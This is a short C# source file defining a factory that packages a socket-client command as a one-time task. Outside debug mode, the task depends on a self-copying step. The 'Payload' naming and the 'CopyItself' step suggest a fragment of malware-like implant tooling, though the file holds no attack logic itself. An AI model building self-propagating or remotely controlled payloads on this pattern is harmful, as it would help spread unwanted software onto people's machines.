using Payload.Command.Interface;
using Payload.Common;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using static Payload.Common.Config;

namespace Payload.Command.SocketClient
{
    public class SocketIOClientFactory : Payload.Command.Interface.IFactory
    {
        public override TaskPack CreateTaskPack()
        {
            return new TaskPack(new SocketIOClientCommand(), Config.EnumTaskPackMode.ONCE, Config.Instance.AppMode.Equals(EnumAppMode.DEBUG)? null :new HashSet<EnumTask>() { EnumTask.CopyItself });
        }
    }
}
